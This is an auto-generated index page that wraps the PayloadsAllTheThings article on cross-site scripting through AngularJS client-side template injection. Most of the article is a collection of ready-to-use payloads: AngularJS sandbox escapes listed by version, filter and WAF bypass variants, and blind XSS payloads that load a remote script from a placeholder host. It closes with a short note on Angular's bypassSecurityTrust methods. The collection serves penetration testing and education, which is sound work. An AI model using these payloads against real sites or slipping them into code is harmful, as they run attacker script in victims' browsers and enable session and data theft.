---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# XSS in Angular and AngularJS

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-xss-injection-5-xss-in-angular` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XSS Injection/5 - XSS in Angular.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [XSS in Angular and AngularJS](../../topics/xss-injection/xss-in-angular-and-angularjs.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-xss-injection-5-xss-in-angular |
| name | XSS in Angular and AngularJS |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md |

## Preserved Source Material

````yaml
_body: "# XSS in Angular and AngularJS\n\n## Summary\n\n* [Client Side Template Injection](#client-side-template-injection)\n\
  \    * [Stored/Reflected XSS](#storedreflected-xss)\n    * [Advanced Bypassing XSS](#advanced-bypassing-xss)\n    * [Blind\
  \ XSS](#blind-xss)\n* [Automatic Sanitization](#automatic-sanitization)\n* [References](#references)\n\n## Client Side Template\
  \ Injection\n\nThe following payloads are based on Client Side Template Injection.\n\n### Stored/Reflected XSS\n\n`ng-app`\
  \ directive must be present in a root element to allow the client-side injection (cf. [AngularJS: API: ngApp](https://docs.angularjs.org/api/ng/directive/ngApp)).\n\
  \n> AngularJS as of version 1.6 have removed the sandbox altogether\n\nAngularJS 1.6+ by [Mario Heiderich](https://twitter.com/cure53berlin)\n\
  \n```javascript\n{{constructor.constructor('alert(1)')()}}\n```\n\nAngularJS 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)\n\
  \n```javascript\n{{[].pop.constructor&#40'alert\\u00281\\u0029'&#41&#40&#41}}\n```\n\nExample available at [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=<brute+ng-app>%7B%7B[].pop.constructor%26%2340%27alert%5Cu00281%5Cu0029%27%26%2341%26%2340%26%2341%7D%7D)\n\
  \nAngularJS 1.6.0 by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)\n\
  \n```javascript\n{{0[a='constructor'][a]('alert(1)')()}}\n{{$eval.constructor('alert(1)')()}}\n{{$on.constructor('alert(1)')()}}\n\
  ```\n\nAngularJS 1.5.9 - 1.5.11 by [Jan Horn](https://twitter.com/tehjh)\n\n```javascript\n{{\n    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;\n\
  \    c.$apply=$apply;c.$eval=b;op=$root.$$phase;\n    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;\n\
  \    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;\n    B=C(b,c,b);$evalAsync(\"\n    astNode=pop();astNode.type='UnaryExpression';\n\
  \    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';\n    astNode.argument={type:'Identifier',name:'foo'};\n\
  \    \");\n    m1=B($$asyncQueue.pop().expression,null,$root);\n    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n    $eval('a(b.c)');[].push.apply=a;\n\
  }}\n```\n\nAngularJS 1.5.0 - 1.5.8\n\n```javascript\n{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}\n\
  ```\n\nAngularJS 1.4.0 - 1.4.9\n\n```javascript\n{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}\n\
  ```\n\nAngularJS 1.3.20\n\n```javascript\n{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}\n```\n\nAngularJS\
  \ 1.3.19\n\n```javascript\n{{\n    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;\n    $eval('x=alert(1)//');\n\
  }}\n```\n\nAngularJS 1.3.3 - 1.3.18\n\n```javascript\n{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;\n\
  \  'a'.constructor.prototype.charAt=[].join;\n  $eval('x=alert(1)//');  }}\n```\n\nAngularJS 1.3.1 - 1.3.2\n\n```javascript\n\
  {{\n    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;\n    'a'.constructor.prototype.charAt=''.valueOf;\n\
  \    $eval('x=alert(1)//');\n}}\n```\n\nAngularJS 1.3.0\n\n```javascript\n{{!ready && (ready = true) && (\n      !call\n\
  \      ? $$watchers[0].get(toString.constructor.prototype)\n      : (a = apply) &&\n        (apply = constructor) &&\n \
  \       (valueOf = call) &&\n        (''+''.toString(\n          'F = Function.prototype;' +\n          'F.apply = F.a;'\
  \ +\n          'delete F.a;' +\n          'delete F.valueOf;' +\n          'alert(1);'\n        ))\n    );}}\n```\n\nAngularJS\
  \ 1.2.24 - 1.2.29\n\n```javascript\n{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\\\"+(y='if(!window\\\\u002ex)alert(window\\\
  \\u002ex=1)')+eval(y)+\\\"'\");}}\n```\n\nAngularJS 1.2.19 - 1.2.23\n\n```javascript\n{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"\
  a\",\"alert(1)\"].sort(toString.constructor);}}\n```\n\nAngularJS 1.2.6 - 1.2.18\n\n```javascript\n{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}\n\
  ```\n\nAngularJS 1.2.2 - 1.2.5\n\n```javascript\n{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(\"\
  x='\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\"'\");}}\n```\n\nAngularJS 1.2.0 - 1.2.1\n\n```javascript\n\
  {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}\n\
  ```\n\nAngularJS 1.0.1 - 1.1.5 and Vue JS\n\n```javascript\n{{constructor.constructor('alert(1)')()}}\n```\n\n### Advanced\
  \ Bypassing XSS\n\nAngularJS (without `'` single and `\"` double quotes) by [@Viren](https://twitter.com/VirenPawar_)\n\n\
  ```javascript\n{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}\n```\n\
  \nAngularJS (without `'` single and `\"` double quotes and `constructor` string)\n\n```javascript\n{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}\n\
  ```\n\n```javascript\n{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}\n\
  ```\n\n```javascript\n{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}\n\
  ```\n\n```javascript\n{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}\n\
  ```\n\nAngularJS bypass Waf [Imperva]\n\n```javascript\n{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\\
  \\u{6f}mpt(d\\\\u{6f}cument.d\\\\u{6f}main)')()}}\n```\n\n### Blind XSS\n\n1.0.1 - 1.1.5 && > 1.6.0 by Mario Heiderich (Cure53)\n\
  \n```javascript\n{{\n    constructor.constructor(\"var _ = document.createElement('script');\n    _.src='//localhost/m';\n\
  \    document.getElementsByTagName('body')[0].appendChild(_)\")()\n}}\n```\n\nShorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis\
  \ Ardern (Synopsys) and Gareth Heyes (PortSwigger)\n\n```javascript\n{{\n    $on.constructor(\"var _ = document.createElement('script');\n\
  \    _.src='//localhost/m';\n    document.getElementsByTagName('body')[0].appendChild(_)\")()\n}}\n```\n\n1.2.0 - 1.2.5\
  \ by Gareth Heyes (PortSwigger)\n\n```javascript\n{{\n    a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim;\n    $eval('a\"\
  ,eval(`var _=document\\\\x2ecreateElement(\\'script\\');\n    _\\\\x2esrc=\\'//localhost/m\\';\n    document\\\\x2ebody\\\
  \\x2eappendChild(_);`),\"')\n}}\n```\n\n1.2.6 - 1.2.18 by Jan Horn (Cure53, now works at Google Project Zero)\n\n```javascript\n\
  {{\n    (_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval(\"\n        var _\
  \ = document.createElement(\\'script\\');\n        _.src=\\'//localhost/m\\';\n        document.getElementsByTagName(\\\
  'body\\')[0].appendChild(_)\")')()\n}}\n```\n\n1.2.19 (FireFox) by Mathias Karlsson\n\n```javascript\n{{\n    toString.constructor.prototype.toString=toString.constructor.prototype.call;\n\
  \    [\"a\",'eval(\"var _ = document.createElement(\\'script\\');\n    _.src=\\'//localhost/m\\';\n    document.getElementsByTagName(\\\
  'body\\')[0].appendChild(_)\")'].sort(toString.constructor);\n}}\n```\n\n1.2.20 - 1.2.29 by Gareth Heyes (PortSwigger)\n\
  \n```javascript\n{{\n    a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim;\n    $eval('a\",eval(`\n    var _=document\\\
  \\x2ecreateElement(\\'script\\');\n    _\\\\x2esrc=\\'//localhost/m\\';\n    document\\\\x2ebody\\\\x2eappendChild(_);`),\"\
  ')\n}}\n```\n\n1.3.0 - 1.3.9 by Gareth Heyes (PortSwigger)\n\n```javascript\n{{\n    a=toString().constructor.prototype;a.charAt=a.trim;\n\
  \    $eval('a,eval(`\n    var _=document\\\\x2ecreateElement(\\'script\\');\n    _\\\\x2esrc=\\'//localhost/m\\';\n    document\\\
  \\x2ebody\\\\x2eappendChild(_);`),a')\n}}\n```\n\n1.4.0 - 1.5.8 by Gareth Heyes (PortSwigger)\n\n```javascript\n{{\n   \
  \ a=toString().constructor.prototype;a.charAt=a.trim;\n    $eval('a,eval(`var _=document.createElement(\\'script\\');\n\
  \    _.src=\\'//localhost/m\\';document.body.appendChild(_);`),a')\n}}\n```\n\n1.5.9 - 1.5.11 by Jan Horn (Cure53, now works\
  \ at Google Project Zero)\n\n```javascript\n{{\n    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;\n    c.$eval=b;op=$root.$$phase;\n\
  \    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;\n    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;\n\
  \    B=C(b,c,b);$evalAsync(\"astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var\
  \ _=document.createElement(\\\\'script\\\\');_.src=\\\\'//localhost/m\\\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};\"\
  );\n    m1=B($$asyncQueue.pop().expression,null,$root);\n    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n    $eval('a(b.c)');[].push.apply=a;\n\
  }}\n```\n\n## Automatic Sanitization\n\n> To systematically block XSS bugs, Angular treats all values as untrusted by default.\
  \ When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation,\
  \ Angular sanitizes and escapes untrusted values.\n\nHowever, it is possible to mark a value as trusted and prevent the\
  \ automatic sanitization with these methods:\n\n* bypassSecurityTrustHtml\n* bypassSecurityTrustScript\n* bypassSecurityTrustStyle\n\
  * bypassSecurityTrustUrl\n* bypassSecurityTrustResourceUrl\n\nExample of a component using the unsecure method `bypassSecurityTrustUrl`:\n\
  \n```js\nimport { Component, OnInit } from '@angular/core';\n\n@Component({\n  selector: 'my-app',\n  template: `\n    <h4>An\
  \ untrusted URL:</h4>\n    <p><a class=\"e2e-dangerous-url\" [href]=\"dangerousUrl\">Click me</a></p>\n    <h4>A trusted\
  \ URL:</h4>\n    <p><a class=\"e2e-trusted-url\" [href]=\"trustedUrl\">Click me</a></p>\n  `,\n})\nexport class App {\n\
  \  constructor(private sanitizer: DomSanitizer) {\n    this.dangerousUrl = 'javascript:alert(\"Hi there\")';\n    this.trustedUrl\
  \ = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl);\n  }\n}\n```\n\n![XSS](https://angular.io/generated/images/guide/security/bypass-security-component.png)\n\
  \nWhen doing a code review, you want to make sure that no user input is being trusted since it will introduce a security\
  \ vulnerability in the application.\n\n## References\n\n* [Angular Security - May 16, 2023](https://angular.io/guide/security)\n\
  * [Bidding Like a Billionaire - Stealing NFTs With 4-Char CSTIs - Matan Berson (@MtnBer) - July 11, 2024](https://web.archive.org/web/20250118075113/https://matanber.com/blog/4-char-csti)\n\
  * [Blind XSS AngularJS Payloads - Lewis Ardern - December 7, 2018](http://web.archive.org/web/20181209041100/https://ardern.io/2018/12/07/angularjs-bxss/)\n\
  * [Bypass DomSanitizer - Swarna (@swarnakishore) - August 11, 2017](https://web.archive.org/web/20250908023652/https://medium.com/@swarnakishore/angular-safe-pipe-implementation-to-bypass-domsanitizer-stripping-out-content-c1bf0f1cc36b)\n\
  * [XSS without HTML - CSTI with Angular JS - Gareth Heyes (@garethheyes) - January 27, 2016](https://web.archive.org/web/20190331015852/https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)"
_relative_path: XSS Injection/5 - XSS in Angular.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XSS Injection/5 - XSS in Angular.md
````
